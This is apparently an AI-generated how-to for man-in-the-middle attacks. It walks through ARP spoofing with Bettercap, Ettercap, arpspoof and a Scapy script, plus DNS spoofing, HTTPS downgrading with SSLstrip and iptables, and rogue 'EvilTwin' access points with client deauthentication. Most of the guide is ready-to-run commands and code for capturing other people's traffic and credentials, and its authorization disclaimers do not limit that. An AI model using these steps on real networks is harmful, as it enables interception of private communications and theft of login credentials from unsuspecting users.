This documentation provides a step-by-step guide on how to perform a Man-in-the-Middle (MITM) attack penetration test using the following tools:

1. **Bettercap**
2. **Ettercap**
3. **arpspoof**
4. **dnsspoof**
5. **SSLstrip**
6. **hostapd**
7. **eviltwin**
8. **scapy**

Before proceeding, ensure you have the necessary permissions to perform these tests on the target network. Unauthorized access to networks or systems is illegal and unethical.

---

## 1\. **Bettercap**

Bettercap is a powerful, modular, and portable MITM framework.

### Steps:

1. **Installation**:

```
sudo apt-get install bettercap
```
2. **Launch Bettercap**:

```
sudo bettercap
```
3. **Scan the Network**:

```
net.probe on
net.recon on
```
4. **ARP Spoofing**:

```
set arp.spoof.targets <target_ip>
arp.spoof on
```
5. **Sniff Traffic**:

```
net.sniff on
```
6. **Capture Credentials**:  
Bettercap can capture credentials from HTTP traffic by default.
7. **Stop the Attack**:

```
net.sniff off
arp.spoof off
```

---

## 2\. **Ettercap**

Ettercap is a comprehensive suite for MITM attacks.

### Steps:

1. **Installation**:

```
sudo apt-get install ettercap-graphical
```
2. **Launch Ettercap**:

```
sudo ettercap -G
```
3. **Scan for Hosts**:

- Go to `Hosts` > `Scan for hosts`.
4. **Select Targets**:

- Add the target IP to `Target 1` and the gateway IP to `Target 2`.
5. **ARP Poisoning**:

- Go to `Mitm` > `ARP poisoning`.
6. **Start Sniffing**:

- Go to `Start` > `Start sniffing`.
7. **Capture Credentials**:

- Ettercap will capture credentials from HTTP traffic.
8. **Stop the Attack**:

- Go to `Mitm` > `Stop mitm attack`.

---

## 3\. **arpspoof**

arpspoof is a tool for ARP cache poisoning.

### Steps:

1. **Installation**:

```
sudo apt-get install dsniff
```
2. **Enable IP Forwarding**:

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```
3. **ARP Spoofing**:

```
arpspoof -i <interface> -t <target_ip> <gateway_ip>
```
4. **Capture Traffic**:

- Use tools like Wireshark or tcpdump to capture traffic.
5. **Stop the Attack**:

- Press `Ctrl+C` to stop arpspoof.

---

## 4\. **dnsspoof**

dnsspoof is a tool for DNS spoofing.

### Steps:

1. **Installation**:

```
sudo apt-get install dsniff
```
2. **Create a Fake DNS File**:

- Create a file (e.g., `dns.txt`) with entries like:

```
192.168.1.100 www.example.com
```
3. **Start dnsspoof**:

```
dnsspoof -i <interface> -f dns.txt
```
4. **Capture Traffic**:

- Redirect traffic to your machine and capture it.
5. **Stop the Attack**:

- Press `Ctrl+C` to stop dnsspoof.

---

## 5\. **SSLstrip**

SSLstrip is a tool for downgrading HTTPS to HTTP.

### Steps:

1. **Installation**:

```
sudo apt-get install sslstrip
```
2. **Set Up IP Forwarding**:

```
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```
3. **Start SSLstrip**:

```
sslstrip -l 8080
```
4. **Capture Credentials**:

- SSLstrip will capture credentials from downgraded HTTPS traffic.
5. **Stop the Attack**:

- Press `Ctrl+C` to stop SSLstrip.

---

## 6\. **hostapd**

hostapd is used to create a rogue access point.

### Steps:

1. **Installation**:

```
sudo apt-get install hostapd
```
2. **Configure hostapd**:

- Create a configuration file (e.g., `hostapd.conf`):

```
interface=wlan0
driver=nl80211
ssid=EvilTwin
hw_mode=g
channel=6
```
3. **Start hostapd**:

```
sudo hostapd hostapd.conf
```
4. **Capture Traffic**:

- Use tools like Wireshark to capture traffic.
5. **Stop the Attack**:

- Press `Ctrl+C` to stop hostapd.

---

## 7\. **eviltwin**

Evil Twin is an attack where a rogue Wi-Fi access point is set up to mimic a legitimate one.

### Steps:

1. **Set Up Rogue AP**:

- Use `hostapd` to create a rogue AP.
2. **Deauthenticate Clients**:

- Use `aireplay-ng` to deauthenticate clients from the legitimate AP.
3. **Capture Traffic**:

- Use tools like Wireshark to capture traffic.
4. **Stop the Attack**:

- Stop the rogue AP and deauthentication attacks.

---

## 8\. **scapy**

Scapy is a powerful Python library for packet manipulation.

### Steps:

1. **Installation**:

```
sudo apt-get install scapy
```
2. **ARP Spoofing with Scapy**:

- Write a Python script to send ARP spoofing packets:

```
from scapy.all import *

def arp_spoof(target_ip, gateway_ip):
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac))
    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))

arp_spoof("192.168.1.100", "192.168.1.1")
```
3. **Capture Traffic**:

- Use Scapy to capture and analyze traffic.
4. **Stop the Attack**:

- Stop the script.

---

## **Conclusion**

This documentation provides a basic guide on how to perform a MITM attack using various tools. Always ensure you have proper authorization before conducting any penetration testing. Unauthorized access to networks or systems is illegal and unethical.

---

**Disclaimer**: This documentation is for educational purposes only. The author is not responsible for any misuse of this information. Always obtain proper authorization before performing any penetration testing.

New chat

AI-generated, for reference only